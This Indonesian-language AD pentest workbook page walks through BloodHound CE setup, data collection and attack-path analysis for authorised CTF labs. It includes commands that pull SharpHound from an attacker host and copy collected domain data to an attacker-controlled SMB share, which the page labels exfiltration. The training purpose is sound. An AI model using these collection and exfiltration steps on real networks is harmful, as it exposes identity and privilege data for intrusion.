---
id: "36"
title: "🩸 36 — Active Directory BloodHound Workflow"
category: "4. Active Directory"
categoryId: "ad"
filename: "36_ad_bloodhound_workflow.md"
refs_out: ["05","06","12","14b","35","37","38","41","43","45","63"]
refs_in: ["11","35","37","41","42","43","45","46"]
---

# 🩸 36 — Active Directory BloodHound Workflow

← [File 35: AD Initial Enumeration](https://chatgpt.com/c/[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration))  
→ [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>)

> **Scope:** HTB, TryHackMe, Proving Grounds, dan lab AD yang memang diizinkan untuk diuji.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Input dari File 35:** domain, DC IP, users, groups, computers, SPNs, credentials, dan BloodHound ZIP.  
> **Output File 36:** graph AD yang dapat dianalisis untuk menemukan relationship, privilege, chokepoint, dan attack path.
> 
> ⚠️ **WARNING:** BloodHound adalah tool security auditing yang mengumpulkan informasi sensitif tentang identity, sessions, ACL, dan privilege. Jalankan hanya pada environment yang memang Anda punya izin untuk audit. Collector dapat menimbulkan network traffic dan endpoint detection.

---

# 🧭 NAVIGATION

← [File 35: AD Initial Enumeration](https://chatgpt.com/c/[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration))  
→ [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/<a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>)

---

# 🧠 BAGIAN 0 — KONTEKS & KAPAN DIGUNAKAN

# 0.1 🗺️ Apa Itu BloodHound

## 🧳 Analogi Sederhana: "Google Maps untuk Active Directory"

Bayangkan Anda masuk ke kota yang sangat besar.

Anda mengetahui:

```text
Nama gedung
Nama jalan
Orang
Kantor
Kartu akses
```

Tetapi masalah sebenarnya:

```text
"Bagaimana saya pergi dari posisi saya
ke ruangan paling penting?"
```

Daftar alamat saja tidak cukup.

Anda membutuhkan **peta hubungan**.

BloodHound melakukan sesuatu yang mirip untuk Active Directory:

```text
User
  ↓
Group
  ↓
Computer
  ↓
Session
  ↓
ACL
  ↓
GPO
  ↓
Domain Admin
```

Sehingga:

```text
Enumeration biasa:

Alice
Bob
Helpdesk
DC01
WEB01
Domain Admins
```

berubah menjadi:

```text
Alice
  │
  └── MemberOf → Helpdesk
                    │
                    └── GenericAll → Bob
                                         │
                                         └── AdminTo → WEB01
```

Itulah kekuatan utama BloodHound.

BloodHound menggunakan graph theory untuk memetakan relationship dan attack paths yang sulit dilihat jika informasi hanya disimpan sebagai daftar teks.

---

# ❓ Masalah yang Diselesaikan BloodHound

Tanpa BloodHound:

```text
Users.txt
Groups.txt
Computers.txt
Shares.txt
GPO.txt
ACL.txt
```

Anda harus menghubungkan semuanya secara mental.

Dengan BloodHound:

```text
NODE
 +
EDGE
 +
GRAPH
 =
RELATIONSHIP
```

Contoh:

```text
Alice
  │
  ├── MemberOf ────────> Helpdesk
  │
  ├── CanRDP ──────────> WEB01
  │
  └── HasSession ──────> WS01
```

Kemudian Anda dapat bertanya:

```text
"Apakah Alice akhirnya bisa mencapai Domain Admin?"
```

---

# 🧠 Kenapa Manual Enumeration Tidak Cukup?

Bayangkan domain mempunyai:

```text
500 users
100 groups
80 computers
40 GPO
10,000 ACL
```

Masalahnya bukan:

```text
"Apakah datanya ada?"
```

Tetapi:

```text
"Bagaimana semuanya saling terhubung?"
```

Contoh:

```text
User
 ↓
MemberOf
 ↓
Group
 ↓
GenericWrite
 ↓
Service Account
 ↓
AdminTo
 ↓
Computer
 ↓
HasSession
 ↓
Domain Admin
```

Relationship seperti ini sangat sulit dipahami dari:

```text
ldapsearch output
```

saja.

---

# 🆚 BloodHound Legacy vs BloodHound CE

|Aspek|Legacy BloodHound|BloodHound CE|
|---|---|---|
|Generasi|Versi lama|Community Edition modern|
|UI|Desktop application|Web UI|
|Backend|Umumnya Neo4j|PostgreSQL + graph backend/Neo4j tergantung deployment|
|Collector|SharpHound / bloodhound-python|SharpHound / `bloodhound-ce-python`|
|Query|Cypher|Cypher + built-in searches|
|Deployment|Native/Neo4j oriented|Containerized deployment umum|
|Fokus|AD graph|AD + graph/security relationship ecosystem|

BloodHound CE saat ini menggunakan arsitektur aplikasi, database aplikasi PostgreSQL, dan graph database Neo4j pada deployment Neo4j; konfigurasi tertentu juga dapat menggunakan PostgreSQL sebagai graph backend.

> **Muscle memory:** jika Anda melihat tutorial lama yang menggunakan `bloodhound-python`, jangan langsung menganggap command tersebut kompatibel dengan CE. Untuk CE gunakan `bloodhound-ce-python`.

---

# 🧩 Komponen BloodHound

```text
                  BLOODHOUND CE
                       │
          ┌────────────┼─────────────┐
          │            │             │
          ▼            ▼             ▼
      Collector      Database       UI
          │            │             │
          │            │             │
       SharpHound   PostgreSQL     Web Browser
       CE-Python    Neo4j          Graph
          │            │             │
          └────────────┼─────────────┘
                       │
                       ▼
                     GRAPH
```

---

## 🕷️ Collector

Collector mengumpulkan fakta:

```text
users
groups
computers
sessions
ACLs
trusts
GPO
local admin relationships
```

---

## 🗄️ Database

BloodHound CE deployment dapat menggunakan:

```text
PostgreSQL
+
Neo4j
```

Deployment Compose resmi menyediakan PostgreSQL untuk application state dan Neo4j untuk graph data dalam konfigurasi Neo4j.

---

## 🖥️ UI

UI digunakan untuk:

```text
Search
Graph
Pathfinding
Cypher
Queries
Owned objects
High Value objects
```

---

# 0.2 🚦 Kapan Digunakan

Trigger sederhana:

```text
Credential valid
      +
BloodHound ZIP/JSON
      ↓
START FILE 36
```

Idealnya dari File 35 Anda sudah mempunyai:

```text
[✓] DOMAIN
[✓] DC_IP
[✓] DC hostname
[✓] USERNAME
[✓] PASSWORD
[✓] USERS
[✓] GROUPS
[✓] COMPUTERS
[✓] SPNs
[✓] BLOODHOUND ZIP
```

---

# 🧾 Prerequisites

```bash
# Set the Active Directory domain
export DOMAIN="corp.local"

# Set the Domain Controller IP
export DC_IP="10.10.10.10"

# Set the domain username discovered in File 35
export USERNAME="alice"

# Set the lab password
export PASSWORD="LAB_PASSWORD"
```

Verifikasi:

```bash
# Confirm domain variable
echo "$DOMAIN"

# Confirm DC IP variable
echo "$DC_IP"

# Confirm username variable
echo "$USERNAME"
```

---

# 0.3 🧠 Mindset Graph Analysis

BloodHound bukan:

```text
"Where is the exploit?"
```

BloodHound adalah:

```text
"Where is the relationship?"
```

Kemudian:

```text
relationship
      ↓
privilege
      ↓
attack path
```

---

# 🎯 Pertanyaan Utama

```text
"Siapa yang bisa mencapai Domain Admin?"
```

Sub-question:

```text
Who owns this object?
Who controls this group?
Who has a session?
Who can RDP?
Who can PSRemote?
Who can modify this object?
Who can reset this user's password?
Who can modify the ACL?
Who can perform DCSync?
Which computer has a privileged user logged in?
```

---

# 🔵 Nodes

Node = object.

Contoh:

```text
User
Group
Computer
Domain
GPO
OU
```

---

# 🔗 Edges

Edge = relationship.

Contoh:

```text
Alice
   │
   └── MemberOf ──> Helpdesk
```

atau:

```text
Alice
   │
   └── CanRDP ──> WEB01
```

---

# ⚠️ Shortest Path ≠ Always Best Path

Misalnya BloodHound memberikan:

```text
Alice
 ↓
GenericAll
 ↓
Bob
 ↓
AdminTo
 ↓
DC01
```

Ini pendek.

Tetapi:

```text
Alice
 ↓
CanRDP
 ↓
WS01
 ↓
HasSession
 ↓
Domain Admin
```

mungkin lebih mudah dilakukan pada CTF tertentu.

Jadi:

```text
Shortest path
        ≠
Easiest path
        ≠
Safest path
        ≠
Most reliable path
```

Prioritas Anda:

```text
Shortest
+
Simple
+
Known credentials
+
Low prerequisites
+
Reliable
```

---

# 🐳 BAGIAN 1 — SETUP BLOODHOUND CE

# 1.1 🐋 Install BloodHound CE di Parrot OS

## ⚠️ Catatan Deployment

Untuk pemula, Docker adalah pilihan paling praktis karena:

```text
BloodHound
PostgreSQL
Neo4j
configuration
network
volumes
```

dapat dijalankan sebagai satu deployment.

Dokumentasi CE menyediakan Docker Compose deployment dan default binding ke localhost.

---

# 🧱 Method 1 — Docker

## Step 1 — Install Docker

```bash
# Update package index
sudo apt update

# Install Docker Engine and Compose plugin
sudo apt install -y docker.io docker-compose-plugin

# Start Docker service
sudo systemctl enable --now docker

# Check Docker service state
sudo systemctl status docker --no-pager

# Check Docker version
docker --version

# Check Docker Compose
docker compose version
```

---

# 🧪 Test Docker

```bash
# Run a minimal container to verify Docker works
sudo docker run --rm hello-world
```

Jika muncul pesan sukses:

```text
Hello from Docker!
```

maka:

```text
Docker
  ↓
WORKING
```

---

# 👤 Optional — Agar Tidak Selalu `sudo`

```bash
# Add current user to the docker group
sudo usermod -aG docker "$USER"

# Apply the new group to the current shell/session
newgrp docker

# Verify Docker without sudo
docker ps
```

⚠️ Membership `docker` group memberikan kontrol yang sangat tinggi terhadap host. Gunakan hanya pada machine/lab yang Anda kontrol.

---

# 📁 Step 2 — Create BloodHound Directory

```bash
# Create a dedicated BloodHound CE directory
mkdir -p ~/tools/bloodhound-ce

# Enter the directory
cd ~/tools/bloodhound-ce
```

---

# 📝 Step 3 — Create Docker Compose

Buat:

```bash
# Open the Compose file
nano docker-compose.yml
```

Isi:

```yaml
services:

  app-db:
    image: docker.io/library/postgres:18

    environment:
      PGUSER: bloodhound
      POSTGRES_USER: bloodhound
      POSTGRES_PASSWORD: bloodhoundcommunityedition
      POSTGRES_DB: bloodhound

    volumes:
      - postgres-data:/var/lib/postgresql

    healthcheck:
      test:
        [
          "CMD-SHELL",
          "pg_isready -U bloodhound -d bloodhound -h 127.0.0.1 -p 5432"
        ]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s


  graph-db:
    image: docker.io/library/neo4j:4.4.42

    environment:
      NEO4J_AUTH: neo4j/bloodhoundcommunityedition
      NEO4J_dbms_allow__upgrade: "true"

    volumes:
      - neo4j-data:/data

    ports:
      - "127.0.0.1:7474:7474"
      - "127.0.0.1:7687:7687"

    healthcheck:
      test:
        [
          "CMD-SHELL",
          "wget -O /dev/null -q http://localhost:7474 || exit 1"
        ]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s


  bloodhound:
    image: docker.io/specterops/bloodhound:latest

    environment:
      bhe_graph_driver: neo4j

      bhe_database_connection: >
        user=bloodhound
        password=bloodhoundcommunityedition
        dbname=bloodhound
        host=app-db

      bhe_neo4j_connection: >
        neo4j://neo4j:bloodhoundcommunityedition@graph-db:7687/

    ports:
      - "127.0.0.1:8080:8080"

    depends_on:
      app-db:
        condition: service_healthy
      graph-db:
        condition: service_healthy


volumes:
  neo4j-data:
  postgres-data:
```

Deployment structure ini mengikuti model Compose CE yang memisahkan application DB, graph DB, dan BloodHound service.

---

# 🧠 Kenapa Port Hanya Localhost?

```text
127.0.0.1:8080
```

artinya:

```text
Parrot OS sendiri
   ↓
BloodHound
```

bukan:

```text
LAN
Internet
```

Ini lebih aman untuk local lab.

Deployment resmi juga default-nya membatasi binding BloodHound ke localhost.

---

# 🐳 Step 4 — Pull Images

```bash
# Download required BloodHound CE images
docker compose pull
```

---

# 🚀 Step 5 — Start BloodHound

```bash
# Start the complete BloodHound CE stack
docker compose up -d
```

Check:

```bash
# Show running containers
docker compose ps
```

Expected:

```text
NAME                 STATUS
bloodhound-graph-db  Up (healthy)
bloodhound-app-db    Up (healthy)
bloodhound           Up
```

---

# 🔎 Step 6 — Check Logs

```bash
# Display BloodHound application logs
docker compose logs bloodhound

# Display only the latest log lines
docker compose logs --tail 100 bloodhound

# Follow logs in real time
docker compose logs -f bloodhound
```

Cari:

```text
Server started successfully
```

dan pada first initialization:

```text
Initial Password Set To: <random-password>
```

BloodHound CE menggunakan username `admin` dan menghasilkan password initial yang random pada setup awal. Setelah login pertama, password perlu diganti.

---

# 🔑 Initial Login

Username:

```text
admin
```

Password:

```text
<random password dari startup logs>
```

Buka browser pada:

```text
http://localhost:8080/ui/login
```

> Ini adalah alamat **localhost** untuk UI lokal BloodHound. Jangan expose port ini ke jaringan luar kecuali Anda memang memahami konsekuensinya.

---

# 🔄 Start / Stop

```bash
# Stop the BloodHound containers without deleting data
docker compose down

# Start them again later
docker compose up -d
```

---

# ⚠️ Jangan Gunakan `down -v` Sembarangan

```bash
# WARNING: This deletes persistent BloodHound/PostgreSQL/Neo4j volumes
docker compose down -v
```

`-v` berarti:

```text
data
↓
DELETE
```

Gunakan hanya jika memang ingin membuat lab dari nol.

---

# 🔑 Mengganti Password

Pada login pertama:

```text
admin
+
initial random password
        ↓
forced password change
        ↓
new password
```

Simpan:

```text
BloodHound admin password
```

di password manager/lab notes, bukan di public repository.

---

# 🔍 Verifikasi Container

```bash
# List all running containers
docker ps

# Check BloodHound container logs
docker logs "$(docker compose ps -q bloodhound)" --tail 100

# Check Neo4j container
docker compose ps graph-db

# Check PostgreSQL container
docker compose ps app-db
```

---

# 🧪 Verifikasi Port

```bash
# Check BloodHound local web service
ss -lntp | grep ':8080'

# Check Neo4j web interface
ss -lntp | grep ':7474'

# Check Neo4j database port
ss -lntp | grep ':7687'
```

---

# 🧰 Method 2 — Alternative Installation

## ⚠️ Jangan Salah Paham

"Native install" BloodHound CE bukan pilihan terbaik untuk pemula.

Current CE workflow berfokus pada containerized deployment dan BloodHound CLI. Official quickstart juga menggunakan CLI yang mengelola deployment Docker Compose.

Jadi pilihan praktis:

```text
Recommended:
Docker Compose

Alternative:
BloodHound CLI

Advanced:
Build from source
```

---

# 🧰 BloodHound CLI Concept

BloodHound CLI adalah wrapper untuk deployment CE berbasis container, jadi secara praktik masih menggunakan Docker.

Flow:

```text
bloodhound-cli
      ↓
Docker Compose
      ↓
BloodHound CE
```

Jika binary `bloodhound-cli` sudah tersedia:

```bash
# Show BloodHound CLI help
./bloodhound-cli --help

# Install the CE environment
sudo ./bloodhound-cli install
```

First launch menghasilkan:

```text
admin
+
random password
```

Password juga dapat di-reset menggunakan mekanisme CLI yang disediakan oleh deployment CLI.

---

# 🩸 1.2 Install Collector

# 🐍 bloodhound-ce-python

BloodHound CE mempunyai collector Python yang berbeda dari legacy `bloodhound-python`.

Install dengan `pipx`:

```bash
# Install pipx if it is not already installed
sudo apt update
sudo apt install -y pipx

# Make pipx binaries available
pipx ensurepath
```

Restart shell atau gunakan path session:

```bash
# Add the common pipx binary directory to PATH
export PATH="$HOME/.local/bin:$PATH"
```

Install:

```bash
# Install the BloodHound CE Python ingestor
pipx install bloodhound-ce
```

Verify:

```bash
# Verify BloodHound CE Python collector
bloodhound-ce-python --help
```

BloodHound.py menyediakan branch/package khusus CE dan command `bloodhound-ce-python`; collector tersebut membutuhkan domain credentials untuk collection normal.

---

# 🧪 Cek Collector

```bash
# Check whether the command is available
which bloodhound-ce-python

# Print command help
bloodhound-ce-python --help
```

Expected:

```text
Usage:
  bloodhound-ce-python [options]
```

---

# 🪶 SharpHound Windows

SharpHound digunakan dari:

```text
Windows host
```

Flow:

```text
Windows
   ↓
SharpHound
   ↓
ZIP
   ↓
Parrot
   ↓
BloodHound CE
```

---

# 📦 Transfer SharpHound ke Windows

## Method A — Python HTTP Server

Di Parrot:

```bash
# Create a temporary transfer directory
mkdir -p ~/labs/ad/transfer

# Enter the transfer directory
cd ~/labs/ad/transfer

# Start a Python HTTP server
python3 -m http.server 8000 --bind 0.0.0.0
```

Di Windows lab:

```powershell
# Download SharpHound from the authorized attacker lab host
curl.exe http://10.10.14.x:8000/SharpHound.exe -o C:\Windows\Temp\SharpHound.exe
```

---

# Method B — Impacket SMB Server

Parrot:

```bash
# Create a share directory
mkdir -p ~/labs/ad/bloodhound/share

# Start an SMB server sharing the directory
impacket-smbserver share ~/labs/ad/bloodhound/share -smb2support
```

Windows:

```cmd
:: Access the lab SMB share
dir \\10.10.14.x\share

:: Copy SharpHound to the Windows lab machine
copy \\10.10.14.x\share\SharpHound.exe C:\Windows\Temp\SharpHound.exe
```

---

# 🪶 SharpHound Collection

Dari Windows lab:

```text
SharpHound.exe -c All
```

ZIP:

```text
SharpHound.exe -c All --zipfilename ad_collection.zip
```

---

# Collection Methods

|Method|Fokus|
|---|---|
|`All`|Collection luas|
|`DCOnly`|Data dominan dari DC/AD|
|`Session`|User sessions|
|`ACL`|ACL relationships|
|`Trusts`|Domain/forest trusts|
|`Container`|Container/OU-related data|
|`ObjectProps`|Object properties|

---

# 🧠 Kapan `All`?

CTF kecil:

```text
-c All
```

biasanya paling praktis.

Environment besar:

```text
-c Session
-c ACL
-c Trusts
```

dapat dipilih sesuai pertanyaan yang ingin dijawab.

Mindset:

```text
Collection method
=
pertanyaan yang ingin dijawab
```

---

# 📤 Exfiltrate ZIP ke Parrot

Parrot:

```bash
# Create an SMB collection directory
mkdir -p ~/labs/ad/bloodhound/incoming

# Start an SMB share for lab file transfer
impacket-smbserver bloodhound ~/labs/ad/bloodhound/incoming -smb2support
```

Windows:

```cmd
:: Copy BloodHound ZIP to the attacker lab share
copy C:\Windows\Temp\ad_collection.zip \\10.10.14.x\bloodhound\ad_collection.zip
```

Parrot:

```bash
# Confirm the ZIP arrived
ls -lh ~/labs/ad/bloodhound/incoming/
```

---

# 🧪 1.3 Setup `/etc/hosts`

BloodHound sangat terbantu oleh DNS/FQDN yang benar.

Misalnya:

```text
DC01.corp.local
```

harus resolve ke:

```text
10.10.10.10
```

---

# Tambahkan DC

```bash
# Add the lab DC hostname to /etc/hosts
echo "$DC_IP dc01.$DOMAIN dc01" | sudo tee -a /etc/hosts
```

Contoh hasil:

```text
10.10.10.10 dc01.corp.local dc01
```

---

# Verifikasi

```bash
# Test hostname resolution
getent hosts "dc01.$DOMAIN"

# Test short hostname
getent hosts dc01
```

Expected:

```text
10.10.10.10    dc01.corp.local
```

---

# 🧠 Kenapa FQDN Penting?

Kerberos menggunakan:

```text
hostname
realm
SPN
DNS
```

Jika Anda menggunakan:

```text
10.10.10.10
```

di tempat yang mengharapkan:

```text
dc01.corp.local
```

Anda dapat mengalami:

```text
SPN mismatch
Kerberos errors
LDAP errors
collection failure
```

---

# 🌐 DNS Check

```bash
# Query the DC hostname using system resolver
nslookup "dc01.$DOMAIN"

# Query the DC hostname using dig
dig "dc01.$DOMAIN"

# Check reverse DNS
dig -x "$DC_IP"
```

---

# 🩸 BAGIAN 2 — DATA COLLECTION

# 2.1 🐍 Collection dengan `bloodhound-ce-python`

## Command Dasar

```bash
# Collect broad AD graph data using valid domain credentials
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -c All \
  --zip
```

---

# 🎯 Kenapa Setiap Flag?

### `-d`

```text
-d "$DOMAIN"
```

Menentukan:

```text
AD domain
```

---

### `-u`

```text
-u "$USERNAME"
```

Username domain.

---

### `-p`

```text
-p "$PASSWORD"
```

Password domain.

---

### `-dc`

```text
-dc "dc01.$DOMAIN"
```

Menentukan Domain Controller.

---

### `-c All`

```text
-c All
```

Collection luas.

---

### `--zip`

Mengarsipkan output collection.

---

# 🧠 Kapan `-ns` Digunakan?

`-ns` = DNS nameserver.

Gunakan jika:

```text
Parrot DNS
   ↓
tidak bisa resolve domain
```

tetapi:

```text
DC
   ↓
menyediakan DNS
```

Contoh:

```bash
# Use the DC as DNS nameserver for BloodHound collection
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -ns "$DC_IP" \
  -c All \
  --zip
```

---

# 🧠 Decision

```text
DNS system bekerja?
       │
      YES
       │
       ▼
run normally

      NO
       │
       ▼
-ns "$DC_IP"
```

---

# 📁 Simpan Output

```bash
# Create a dedicated BloodHound collection directory
mkdir -p ~/labs/ad/bloodhound/collections

# Run collection and save terminal output
bloodhound-ce-python \
  -d "$DOMAIN" \
  -u "$USERNAME" \
  -p "$PASSWORD" \
  -dc "dc01.$DOMAIN" \
  -c All \
  --zip \
  | tee ~/labs/ad/bloodhound/collections/collection.log
```

---

# 📦 Cari Output

```bash
# Find BloodHound ZIP files
find . \
  -maxdepth 2 \
  -type f \
  -name '*.zip' \
  -ls

# Find JSON collection files
find . \
  -maxdepth 2 \
  -type f \
  -name '*.json' \
  -ls
```

---

# Contoh Output Terminal

```text
INFO: Found AD domain: corp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 42 users
INFO: Found 21 groups
INFO: Found 17 computers
INFO: Found 8 gpos
INFO: Found 12 ous
INFO: Found 1 trusts
INFO: Starting computer enumeration
INFO: Starting session enumeration
INFO: Starting ACL enumeration
INFO: Compressing output
```

BloodHound CE collector memang ditujukan untuk mengumpulkan object/relationship seperti users, computers, groups, trusts, sessions, dan local admins.

---

# 🧠 Analisis Output

```text
Found 42 users
```

→ user nodes akan tersedia.

```text
Found 21 groups
```

→ group relationships.

```text
Found 17 computers
```

→ computer nodes.

```text
Found 8 gpos
```

→ GPO relationships.

```text
Found 1 trusts
```

→ trust relationship.

---

# ❌ Collection Tidak Lengkap

Misalnya:

```text
Found 42 users
Found 0 computers
```

Jangan langsung menyimpulkan:

```text
"Domain tidak punya komputer."
```

Lebih mungkin:

```text
collection failure
DNS issue
permissions
SMB/RPC blocked
wrong DC
```

---

# 2.2 🪶 Collection dengan SharpHound

## Basic

```text
SharpHound.exe -c All
```

Output:

```text
2026...._BloodHound.zip
```

---

# DCOnly

```text
SharpHound.exe -c DCOnly
```

Gunakan ketika:

```text
AD/DC information
```

lebih penting daripada session collection.

---

# ACL Only

```text
SharpHound.exe -c ACL
```

Berguna jika pertanyaan:

```text
"Who can modify what?"
```

---

# Sessions

```text
SharpHound.exe -c Session
```

Pertanyaan:

```text
"Who is logged into which computer?"
```

---

# All

```text
SharpHound.exe -c All --zipfilename ad_all.zip
```

---

# 🧠 SharpHound Output

```text
Collection
    ↓
JSON
    ↓
ZIP
    ↓
BloodHound import
```

Jangan mengubah:

```text
JSON
```

secara manual kecuali Anda benar-benar memahami schema.

---

# 2.3 ✅ Verifikasi Data

## Cek ZIP

```bash
# Identify the ZIP file type
file ad_collection.zip

# Show ZIP contents
unzip -l ad_collection.zip
```

Expected:

```text
users.json
groups.json
computers.json
domains.json
gpos.json
ous.json
containers.json
sessions.json
```

Exact file set dapat berbeda tergantung collector dan collection method.

---

# Extract ke Temporary Directory

```bash
# Create a temporary extraction directory
mkdir -p /tmp/bh-check

# Extract the collection ZIP
unzip -o ad_collection.zip -d /tmp/bh-check

# List extracted files
find /tmp/bh-check -maxdepth 1 -type f -printf '%f\n'
```

---

# 🧪 Count JSON

```bash
# Count JSON files
find /tmp/bh-check -type f -name '*.json' | wc -l
```

---

# ✅ Collection Berhasil Jika

```text
[✓] ZIP valid
[✓] JSON files present
[✓] users data present
[✓] groups data present
[✓] computers data present
[✓] domains data present
[✓] ACL/session files present when collected
```

---

# ❌ Tanda Collection Gagal

```text
[ ] ZIP kosong
[ ] hanya domains.json
[ ] users = 0
[ ] computers = 0
[ ] parser errors
[ ] DNS failures
[ ] Kerberos failures
```

---

# 📊 BAGIAN 3 — IMPORT DATA KE BLOODHOUND

# 3.1 🖥️ Login ke BloodHound CE

Buka:

```text
http://localhost:8080/ui/login
```

Login:

```text
Username:
admin

Password:
initial random password
```

Setelah first login:

```text
change password
```

BloodHound CE default login menggunakan `admin` + randomly generated initial password pada fresh deployment.

---

# 🧭 Interface Overview

Secara umum Anda akan menemukan area:

```text
┌─────────────────────────────────────┐
│ Search                              │
├─────────────────────────────────────┤
│ Explore / Graph                     │
├─────────────────────────────────────┤
│ Queries / Cypher                    │
├─────────────────────────────────────┤
│ Object details                      │
├─────────────────────────────────────┤
│ Pathfinding                         │
└─────────────────────────────────────┘
```

Nama menu dapat berbeda sedikit antar versi.

Jangan hafalkan posisi pixel.

Hafalkan fungsi:

```text
Search
Analyze
Query
Object
Path
```

---

# 3.2 📥 Import ZIP/JSON

## Step-by-Step

```text
1. Login
2. Open upload/import function
3. Select ZIP
4. Start import
5. Wait until ingestion completes
6. Open Search
7. Search domain
8. Search a known user
9. Search a known computer
```

BloodHound CE UI menyediakan workflow untuk ingest data collector dan kemudian mengeksplorasi graph.

---

# Import Verification

Cari:

```text
corp.local
```

Kemudian:

```text
alice
```

Kemudian:

```text
DC01
```

---

# 🧪 Sanity Check

Anda sudah tahu dari File 35:

```text
alice
DC01
Domain Admins
```

Pastikan semua ditemukan di BloodHound.

---

# 3.3 ✅ Verifikasi Domain Terdeteksi

Search:

```text
corp.local
```

Expected:

```text
Domain
corp.local
```

Kemudian buka:

```text
Object details
```

Periksa:

```text
Users
Groups
Computers
OUs
GPOs
```

---

# 📊 Node Count

Tujuannya bukan angka tertentu.

Tujuannya:

```text
Count di BloodHound
≈
Count dari File 35
```

Contoh:

```text
File 35:
Users     = 42
Groups    = 21
Computers = 17

BloodHound:
Users     ≈ 42
Groups    ≈ 21
Computers ≈ 17
```

Jika:

```text
File 35:
42 users

BloodHound:
0 users
```

→ import/collection issue.

---

# 🔬 BAGIAN 4 — ANALISIS: QUERY PENTING

> Ini adalah inti File 36.
> 
> Jangan sekadar menjalankan query.
> 
> Untuk setiap hasil tanyakan:
> 
> ```text
> WHAT?
> WHY?
> SO WHAT?
> NEXT?
> ```

---

# 4.1 🔎 PRE-BUILT QUERIES

Nama menu dapat sedikit berubah antar versi, tetapi konsep query di bawah tetap menjadi baseline analysis.

---

# A — Find All Domain Admins 👑

## APA yang Dicari?

Semua user/group yang mempunyai hubungan menuju:

```text
Domain Admins
```

---

## KENAPA Penting?

Domain Admins mempunyai privilege sangat tinggi dalam domain.

Anda ingin mengetahui:

```text
Who are they?
Are they active?
Where do they log in?
Are any reachable from my owned user?
```

---

## Cara Akses

```text
BloodHound UI
  ↓
Explore / Queries
  ↓
Search built-in queries
  ↓
Find All Domain Admins
```

---

## Direct vs Nested Membership

Contoh:

```text
Alice
  ↓
MemberOf
  ↓
Domain Admins
```

direct.

Nested:

```text
Alice
  ↓
Helpdesk
  ↓
IT Admins
  ↓
Domain Admins
```

lebih panjang.

---

## Apa yang Dilakukan Jika Ada Hasil?

Buka node Domain Admin.

Cari:

```text
Members
Sessions
ACL
Paths
```

---

# B — Shortest Path to Domain Admins ⭐

## Ini Query Paling Penting

Pertanyaan:

```text
"Bagaimana node ini mencapai Domain Admin?"
```

---

## Graph Example

```text
[Owned User]
     │
     │ MemberOf
     ▼
 [Helpdesk]
     │
     │ GenericAll
     ▼
 [Service User]
     │
     │ AdminTo
     ▼
 [WEB01]
     │
     │ HasSession
     ▼
[Domain Admin]
```

---

## Cara Baca

Jangan melihat graph sebagai:

```text
garis random
```

Baca sebagai:

```text
SOURCE
 ↓
RELATIONSHIP
 ↓
TARGET
```

Contoh:

```text
Alice
 ↓
CanRDP
 ↓
WEB01
```

Artinya:

```text
Alice mempunyai relationship CanRDP terhadap WEB01.
```

---

## Apa yang Harus Dilakukan?

Untuk setiap edge:

```text
1. Apa artinya?
2. Prerequisite?
3. Apakah credential diperlukan?
4. Apakah target bisa dijangkau?
5. Apakah relationship masih valid?
6. Apakah ada cara yang lebih mudah?
```

---

# C — Find Principals with DCSync Rights 💀

## Apa Itu DCSync?

DCSync adalah kemampuan untuk meminta material replication tertentu dari domain melalui mekanisme directory replication.

BloodHound dapat memperlihatkan relationship seperti:

```text
GetChanges
GetChangesAll
DCSync
```

---

## Kenapa Critical?

Jika attacker-controlled principal mempunyai kombinasi hak replication yang tepat terhadap domain:

```text
Principal
   ↓
GetChanges
+
GetChangesAll
   ↓
DCSync capability
```

maka impact dapat sangat tinggi karena credential material domain dapat terpengaruh.

---

## Cara Akses

```text
Queries
 ↓
DCSync
 ↓
Review principals
```

---

## Jika Ada Hasil

Tanyakan:

```text
Who has the rights?
User?
Group?
Computer?
Is it directly granted?
Is it inherited?
```

---

# D — Find Computers where Domain Admins are Logged In 💻

## Apa yang Dicari?

Computer yang mempunyai:

```text
HasSession
```

oleh privileged user.

---

## Kenapa Penting?

Contoh:

```text
WEB01
  │
  └── HasSession ← Alice
                       │
                       └── Domain Admin
```

Maka:

```text
WEB01
```

menjadi host bernilai tinggi.

---

## Cara Interpretasi

Cari:

```text
Computer
 ↓
HasSession
 ↓
Privileged User
```

---

## Next Step

Periksa:

```text
Can I access the computer?
AdminTo?
CanRDP?
CanPSRemote?
```

---

# E — Find All Users with Unconstrained Delegation 🔥

## Apa Itu?

Unconstrained delegation memungkinkan service/computer tertentu menerima delegated authentication credentials/tickets dalam konteks yang berisiko tinggi.

Graph:

```text
User/Computer
      │
      └── Unconstrained Delegation
```

---

## Kenapa Bahaya?

Jika privileged user melakukan authentication pada host yang memiliki konfigurasi delegation berisiko:

```text
Privileged authentication
        ↓
Delegation host
        ↓
credential/ticket exposure risk
```

---

## Jika Ada Hasil

Jangan langsung:

```text
"exploit"
```

Tanyakan:

```text
Who uses the host?
Which privileged accounts authenticate there?
Is this DC?
Is there an easier path?
```

---

# F — Find Kerberoastable Users 🎫

Cari:

```text
User
  ↓
HasSPN
```

Biasanya:

```text
hasspn = true
```

---

## Kenapa Penting?

SPN user dapat menjadi candidate untuk Kerberos service-ticket based credential attack.

File berikutnya akan membahas:

← [File 37: Kerberoasting & AS-REP Roasting](https://chatgpt.com/c/[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting))

---

## Next Step

Dari BloodHound:

```text
Find Kerberoastable User
       ↓
record username/SPN
       ↓
File 37
```

---

# G — Find AS-REP Roastable Users 🔥

Cari:

```text
User
 ↓
DONT_REQUIRE_PREAUTH
```

atau equivalent property/relationship collected by BloodHound.

---

## Kenapa Penting?

Artinya user mungkin:

```text
